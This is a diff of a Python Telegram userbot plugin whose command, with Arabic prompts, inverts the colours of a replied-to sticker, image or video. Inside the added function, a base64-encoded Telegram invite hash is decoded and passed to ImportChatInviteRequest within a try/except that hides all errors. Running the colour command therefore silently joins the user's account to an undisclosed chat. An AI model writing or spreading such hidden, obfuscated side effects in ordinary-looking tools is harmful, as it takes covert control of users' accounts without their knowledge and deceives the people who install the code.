@@ -45,89 +45,73 @@ async def crop(imagefile, endname, x):
     inverted_image.save(endname)
 
 
-@jmthon.on(admin_cmd(pattern="عكس اللون$", outgoing=True))
-@jmthon.on(sudo_cmd(pattern="عكس اللون$", allow_sudo=True))
-async def memes(roz):
-    if roz.fwd_from:
-        return
-    reply = await roz.get_reply_message()
+@jmthon.on(admin_cmd(pattern="عكس اللوان$", outgoing=True))
+async def memes(mafia):
+    reply = await mafia.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(roz, "**- يجب عليك على ميديا تدعم الامر**")
+        await edit_or_reply(mafia, "الرد على الوسائط المدعومة...")
         return
-    rozid = roz.reply_to_msg_id
+    mafiaid = mafia.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    roz = await edit_or_reply(roz, "- يتم التعرف على بيانات الميديا")
+    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    rozsticker = await reply.download_media(file="./temp/")
-    if not rozsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(rozsticker)
-        await edit_or_reply(roz, "- لم يتم العثور على ميديا تدعم الامر")
+    mafiasticker = await reply.download_media(file="./temp/")
+    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(mafiasticker)
+        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
         return
     import base64
 
     kraken = None
-    if rozsticker.endswith(".tgs"):
-        await roz.edit(
-            "- يتم تحليل هذه الميديا - عكس ألوان هذا الملصق المتحرك"
-        )
-        rozfile = os.path.join("./temp/", "meme.png")
-        rozcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {rozsticker} {rozfile}"
-        )
-        stdout, stderr = (await runcmd(rozcmd))[:2]
-        if not os.path.lexists(rozfile):
-            await roz.edit("**- لم يتم العثور على قالب معين**")
+    if mafiasticker.endswith(".tgs"):
+        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان!"        )
+        mafiafile = os.path.join("./temp/", "meme.png")
+        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
+        stdout, stderr = (await runcmd(mafiacmd))[:2]
+        if not os.path.lexists(mafiafile):
+            await mafia.edit("القالب غير موجود")
             LOGS.info(stdout + stderr)
-        meme_file = rozfile
+        meme_file = mafiafile
         kraken = True
-    elif rozsticker.endswith(".webp"):
-        await roz.edit(
-            "- يتم التعرف على الميديا وعكس الالوان"
-        )
-        rozfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(rozsticker, rozfile)
-        if not os.path.lexists(rozfile):
-            await roz.edit("`**- لم يتم العثور على قالب معين** `")
+    elif mafiasticker.endswith(".webp"):
+        await mafia.edit(            "تحليل هذه الوسائط - عكس الألوان ..."        )
+        mafiafile = os.path.join("./temp/", "memes.jpg")
+        os.rename(mafiasticker, mafiafile)
+        if not os.path.lexists(mafiafile):
+            await mafia.edit("القالب غير موجود .. ")
             return
-        meme_file = rozfile
+        meme_file = mafiafile
         kraken = True
-    elif rozsticker.endswith((".mp4", ".mov")):
-        await roz.edit(
-            "يتم التعرف على الميديا وعكس الالوان"
-        )
-        rozfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(rozsticker, 0, rozfile)
-        if not os.path.lexists(rozfile):
-            await roz.edit("- قالب الميديا خطأ")
+    elif mafiasticker.endswith((".mp4", ".mov")):
+        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذا الفيديو!"        )
+        mafiafile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(mafiasticker, 0, mafiafile)
+        if not os.path.lexists(mafiafile):
+            await mafia.edit("القالب غير موجود")
             return
-        meme_file = rozfile
+        meme_file = mafiafile
         kraken = True
     else:
-        await roz.edit(
-            "يتم التعرف على الميديا وعكس الالوان"
-        )
-        meme_file = rozsticker
+        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذه الصورة!"        )
+        meme_file = mafiasticker
     try:
-        san = base64.b64decode("aHR0cHM6Ly90Lm1lL0plcHRob24=")
+        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await roz.client(san)
+        await mafia.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if kraken else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await roz.client.send_file(
-        roz.chat_id, outputfile, force_document=False, reply_to=rozid
-    )
-    await roz.delete()
+    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
+    await mafia.delete()
     os.remove(outputfile)
-    for files in (rozsticker, meme_file):
+    for files in (mafiasticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
-
 
 @jmthon.on(admin_cmd(outgoing=True, pattern="فلتر شمسي$"))
 async def memes(roz):
